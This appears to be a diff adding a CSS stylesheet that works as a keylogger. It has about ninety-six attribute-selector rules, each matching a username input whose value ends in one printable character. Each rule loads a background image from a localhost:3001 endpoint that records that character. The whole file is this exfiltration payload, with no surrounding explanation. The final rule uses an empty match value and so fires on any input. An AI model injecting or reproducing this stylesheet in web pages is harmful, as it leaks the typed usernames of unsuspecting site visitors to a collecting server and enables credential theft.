@@ -1,0 +1,288 @@
+input[name='username'][value$=' '] {
+  background-image: url('https://localhost:3001/api/username/+');
+}
+input[name='username'][value$='!'] {
+  background-image: url('https://localhost:3001/api/username/%21');
+}
+input[name='username'][value$='"'] {
+  background-image: url('https://localhost:3001/api/username/%22');
+}
+input[name='username'][value$='#'] {
+  background-image: url('https://localhost:3001/api/username/%23');
+}
+input[name='username'][value$='$'] {
+  background-image: url('https://localhost:3001/api/username/%24');
+}
+input[name='username'][value$='%'] {
+  background-image: url('https://localhost:3001/api/username/%25');
+}
+input[name='username'][value$='&'] {
+  background-image: url('https://localhost:3001/api/username/%26');
+}
+input[name='username'][value$="'"] {
+  background-image: url('https://localhost:3001/api/username/%27');
+}
+input[name='username'][value$='('] {
+  background-image: url('https://localhost:3001/api/username/%28');
+}
+input[name='username'][value$=')'] {
+  background-image: url('https://localhost:3001/api/username/%29');
+}
+input[name='username'][value$='*'] {
+  background-image: url('https://localhost:3001/api/username/%2A');
+}
+input[name='username'][value$='+'] {
+  background-image: url('https://localhost:3001/api/username/%2B');
+}
+input[name='username'][value$=','] {
+  background-image: url('https://localhost:3001/api/username/%2C');
+}
+input[name='username'][value$='-'] {
+  background-image: url('https://localhost:3001/api/username/-');
+}
+input[name='username'][value$='.'] {
+  background-image: url('https://localhost:3001/api/username/.');
+}
+input[name='username'][value$='/'] {
+  background-image: url('https://localhost:3001/api/username/%2F');
+}
+input[name='username'][value$='0'] {
+  background-image: url('https://localhost:3001/api/username/0');
+}
+input[name='username'][value$='1'] {
+  background-image: url('https://localhost:3001/api/username/1');
+}
+input[name='username'][value$='2'] {
+  background-image: url('https://localhost:3001/api/username/2');
+}
+input[name='username'][value$='3'] {
+  background-image: url('https://localhost:3001/api/username/3');
+}
+input[name='username'][value$='4'] {
+  background-image: url('https://localhost:3001/api/username/4');
+}
+input[name='username'][value$='5'] {
+  background-image: url('https://localhost:3001/api/username/5');
+}
+input[name='username'][value$='6'] {
+  background-image: url('https://localhost:3001/api/username/6');
+}
+input[name='username'][value$='7'] {
+  background-image: url('https://localhost:3001/api/username/7');
+}
+input[name='username'][value$='8'] {
+  background-image: url('https://localhost:3001/api/username/8');
+}
+input[name='username'][value$='9'] {
+  background-image: url('https://localhost:3001/api/username/9');
+}
+input[name='username'][value$=':'] {
+  background-image: url('https://localhost:3001/api/username/%3A');
+}
+input[name='username'][value$=';'] {
+  background-image: url('https://localhost:3001/api/username/%3B');
+}
+input[name='username'][value$='<'] {
+  background-image: url('https://localhost:3001/api/username/%3C');
+}
+input[name='username'][value$='='] {
+  background-image: url('https://localhost:3001/api/username/%3D');
+}
+input[name='username'][value$='>'] {
+  background-image: url('https://localhost:3001/api/username/%3E');
+}
+input[name='username'][value$='?'] {
+  background-image: url('https://localhost:3001/api/username/%3F');
+}
+input[name='username'][value$='@'] {
+  background-image: url('https://localhost:3001/api/username/%40');
+}
+input[name='username'][value$='A'] {
+  background-image: url('https://localhost:3001/api/username/A');
+}
+input[name='username'][value$='B'] {
+  background-image: url('https://localhost:3001/api/username/B');
+}
+input[name='username'][value$='C'] {
+  background-image: url('https://localhost:3001/api/username/C');
+}
+input[name='username'][value$='D'] {
+  background-image: url('https://localhost:3001/api/username/D');
+}
+input[name='username'][value$='E'] {
+  background-image: url('https://localhost:3001/api/username/E');
+}
+input[name='username'][value$='F'] {
+  background-image: url('https://localhost:3001/api/username/F');
+}
+input[name='username'][value$='G'] {
+  background-image: url('https://localhost:3001/api/username/G');
+}
+input[name='username'][value$='H'] {
+  background-image: url('https://localhost:3001/api/username/H');
+}
+input[name='username'][value$='I'] {
+  background-image: url('https://localhost:3001/api/username/I');
+}
+input[name='username'][value$='J'] {
+  background-image: url('https://localhost:3001/api/username/J');
+}
+input[name='username'][value$='K'] {
+  background-image: url('https://localhost:3001/api/username/K');
+}
+input[name='username'][value$='L'] {
+  background-image: url('https://localhost:3001/api/username/L');
+}
+input[name='username'][value$='M'] {
+  background-image: url('https://localhost:3001/api/username/M');
+}
+input[name='username'][value$='N'] {
+  background-image: url('https://localhost:3001/api/username/N');
+}
+input[name='username'][value$='O'] {
+  background-image: url('https://localhost:3001/api/username/O');
+}
+input[name='username'][value$='P'] {
+  background-image: url('https://localhost:3001/api/username/P');
+}
+input[name='username'][value$='Q'] {
+  background-image: url('https://localhost:3001/api/username/Q');
+}
+input[name='username'][value$='R'] {
+  background-image: url('https://localhost:3001/api/username/R');
+}
+input[name='username'][value$='S'] {
+  background-image: url('https://localhost:3001/api/username/S');
+}
+input[name='username'][value$='T'] {
+  background-image: url('https://localhost:3001/api/username/T');
+}
+input[name='username'][value$='U'] {
+  background-image: url('https://localhost:3001/api/username/U');
+}
+input[name='username'][value$='V'] {
+  background-image: url('https://localhost:3001/api/username/V');
+}
+input[name='username'][value$='W'] {
+  background-image: url('https://localhost:3001/api/username/W');
+}
+input[name='username'][value$='X'] {
+  background-image: url('https://localhost:3001/api/username/X');
+}
+input[name='username'][value$='Y'] {
+  background-image: url('https://localhost:3001/api/username/Y');
+}
+input[name='username'][value$='Z'] {
+  background-image: url('https://localhost:3001/api/username/Z');
+}
+input[name='username'][value$='['] {
+  background-image: url('https://localhost:3001/api/username/%5B');
+}
+input[name='username'][value$='\\'] {
+  background-image: url('https://localhost:3001/api/username/%5C');
+}
+input[name='username'][value$=']'] {
+  background-image: url('https://localhost:3001/api/username/%5D');
+}
+input[name='username'][value$='^'] {
+  background-image: url('https://localhost:3001/api/username/%5E');
+}
+input[name='username'][value$='_'] {
+  background-image: url('https://localhost:3001/api/username/_');
+}
+input[name='username'][value$='`'] {
+  background-image: url('https://localhost:3001/api/username/%60');
+}
+input[name='username'][value$='a'] {
+  background-image: url('https://localhost:3001/api/username/a');
+}
+input[name='username'][value$='b'] {
+  background-image: url('https://localhost:3001/api/username/b');
+}
+input[name='username'][value$='c'] {
+  background-image: url('https://localhost:3001/api/username/c');
+}
+input[name='username'][value$='d'] {
+  background-image: url('https://localhost:3001/api/username/d');
+}
+input[name='username'][value$='e'] {
+  background-image: url('https://localhost:3001/api/username/e');
+}
+input[name='username'][value$='f'] {
+  background-image: url('https://localhost:3001/api/username/f');
+}
+input[name='username'][value$='g'] {
+  background-image: url('https://localhost:3001/api/username/g');
+}
+input[name='username'][value$='h'] {
+  background-image: url('https://localhost:3001/api/username/h');
+}
+input[name='username'][value$='i'] {
+  background-image: url('https://localhost:3001/api/username/i');
+}
+input[name='username'][value$='j'] {
+  background-image: url('https://localhost:3001/api/username/j');
+}
+input[name='username'][value$='k'] {
+  background-image: url('https://localhost:3001/api/username/k');
+}
+input[name='username'][value$='l'] {
+  background-image: url('https://localhost:3001/api/username/l');
+}
+input[name='username'][value$='m'] {
+  background-image: url('https://localhost:3001/api/username/m');
+}
+input[name='username'][value$='n'] {
+  background-image: url('https://localhost:3001/api/username/n');
+}
+input[name='username'][value$='o'] {
+  background-image: url('https://localhost:3001/api/username/o');
+}
+input[name='username'][value$='p'] {
+  background-image: url('https://localhost:3001/api/username/p');
+}
+input[name='username'][value$='q'] {
+  background-image: url('https://localhost:3001/api/username/q');
+}
+input[name='username'][value$='r'] {
+  background-image: url('https://localhost:3001/api/username/r');
+}
+input[name='username'][value$='s'] {
+  background-image: url('https://localhost:3001/api/username/s');
+}
+input[name='username'][value$='t'] {
+  background-image: url('https://localhost:3001/api/username/t');
+}
+input[name='username'][value$='u'] {
+  background-image: url('https://localhost:3001/api/username/u');
+}
+input[name='username'][value$='v'] {
+  background-image: url('https://localhost:3001/api/username/v');
+}
+input[name='username'][value$='w'] {
+  background-image: url('https://localhost:3001/api/username/w');
+}
+input[name='username'][value$='x'] {
+  background-image: url('https://localhost:3001/api/username/x');
+}
+input[name='username'][value$='y'] {
+  background-image: url('https://localhost:3001/api/username/y');
+}
+input[name='username'][value$='z'] {
+  background-image: url('https://localhost:3001/api/username/z');
+}
+input[name='username'][value$='{'] {
+  background-image: url('https://localhost:3001/api/username/%7B');
+}
+input[name='username'][value$='|'] {
+  background-image: url('https://localhost:3001/api/username/%7C');
+}
+input[name='username'][value$='\\}'] {
+  background-image: url('https://localhost:3001/api/username/%7D');
+}
+input[name='username'][value$='~'] {
+  background-image: url('https://localhost:3001/api/username/~');
+}
+input[name='username'][value$=''] {
+  background-image: url('https://localhost:3001/api/username/%7F');
+}
